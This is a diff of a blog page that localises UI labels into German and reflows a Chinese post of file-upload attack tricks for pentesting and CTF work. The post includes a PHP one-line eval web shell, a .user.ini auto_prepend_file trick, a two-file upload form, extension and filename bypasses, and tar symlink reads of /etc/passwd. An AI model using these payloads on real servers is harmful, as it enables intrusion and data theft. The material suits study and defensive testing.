@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -145,7 +145,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    6 minutes read (About 885 words)
+                    6 minutes lesen (Über 885 Worte)
                 </span>
                 
                 
@@ -160,15 +160,32 @@
         <div class="content">
             <script type="text/javascript" src="/js/src/bai.js"></script>
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。<br><a id="more"></a></p>
-<h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>竞争上传原理：有些服务器采用了先保存，再删除不合法文件的方式。所以我们可以上传一个生成shell的文件，然后通过不断的访问这个文件，就会有个时间差，从而在服务器上生成一个shell。<br>操作：使用burp<br>上传生成shell的文件，发送到Intruder模块。<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"><br>假如我们知道了文件上传的路径，我们就可以不断访问这个，从而生成shell。<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><br>设置成null payload：<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><br>两个模块一块跑<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image"><br>最后生成了shell<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image"></p>
-<h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><p>比较老的一个文件上传漏洞<br>原理：上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>所以我们可以本地构造上传的poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name&#x3D;&quot;form&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;http:&#x2F;&#x2F;test&#x2F;upload.asp&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>第一个文件上传合法文件，第二个文件上传shell文件。</p>
-<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>PHP版本&lt;5.3.4<br>上传包中泄露了上传地址<br>php的magic_quotes_gpc为OFF状态<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image"></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。</p>
+<a id="more"></a>
+<h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>竞争上传原理：有些服务器采用了先保存，再删除不合法文件的方式。所以我们可以上传一个生成shell的文件，然后通过不断的访问这个文件，就会有个时间差，从而在服务器上生成一个shell。<br>操作：使用burp<br>上传生成shell的文件，发送到Intruder模块。</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image">
+<p>假如我们知道了文件上传的路径，我们就可以不断访问这个，从而生成shell。</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image">
+<p>设置成null payload：</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image">
+<p>两个模块一块跑</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image">
+<p>最后生成了shell</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image">
+
+<h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><p>比较老的一个文件上传漏洞<br>原理：上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>所以我们可以本地构造上传的poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name&#x3D;&quot;form&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;http:&#x2F;&#x2F;test&#x2F;upload.asp&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>第一个文件上传合法文件，第二个文件上传shell文件。</p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>PHP版本&lt;5.3.4<br>上传包中泄露了上传地址<br>php的magic_quotes_gpc为OFF状态</p>
+<img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image">
 <h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>利用条件：<br>在上传文件夹中存在php可执行文件<br>主要利用了两个参数：<br><strong>auto_append_file、auto_prepend_file</strong></p>
 <blockquote>
 <p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句： require(./a.jpg);<br>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有 exit() 时该设置无效）</p>
 </blockquote>
-<p>所以我们可以自定义一个.user.ini上传：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure><br>这个意思是在同个目录的php文件开头自动加载执行a.jpg<br>所以我们直接上传a.jpg里面包含一句话即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval(@$_REQUEST[1])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>所以我们可以自定义一个.user.ini上传：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
+<p>这个意思是在同个目录的php文件开头自动加载执行a.jpg<br>所以我们直接上传a.jpg里面包含一句话即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval(@$_REQUEST[1])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="上传黑名单"><a href="#上传黑名单" class="headerlink" title="上传黑名单"></a>上传黑名单</h4><p>在CTF中经常用的后缀名：phtml，shtml<br><strong>php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</strong></p>
 <h4 id="系统命名绕过"><a href="#系统命名绕过" class="headerlink" title="系统命名绕过"></a>系统命名绕过</h4><p>在Windows系统中，上传index.php. 会重命名为 . ，可以绕过后缀检查。 也可尝试 index.php%20 ， index.php:1.jpg index.php::$DATA 等。 在Linux系统中，可以尝试上传名为 index.php/. 或 ./aa/../index.php/. 的文件</p>
 <h4 id="软链接任意读取文件"><a href="#软链接任意读取文件" class="headerlink" title="软链接任意读取文件"></a>软链接任意读取文件</h4><p>让用户上传一个 tar 压缩包 , 然后会将其中的 txt 文件的内容显示出来正解是先本地创建一个符号链接指向某一个敏感文件的绝对路径 (/etc/passwd)然后使用 tar 打包后上传给具有漏洞的程序 , 然后 , 经过程序处理以后就会 follow 符号链接将文件内容显示出来<br>参考博客：<br><a href="https://www.lizenghai.com/archives/5763.html">https://www.lizenghai.com/archives/5763.html</a></p>
@@ -184,7 +201,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
         <div class="buttons is-centered">
             
                 
@@ -289,7 +306,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -419,7 +436,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -444,7 +461,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -473,7 +490,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -578,7 +595,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -746,7 +763,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -771,7 +788,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -800,7 +817,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -905,7 +922,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1154,7 +1171,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1178,7 +1195,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1191,10 +1208,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
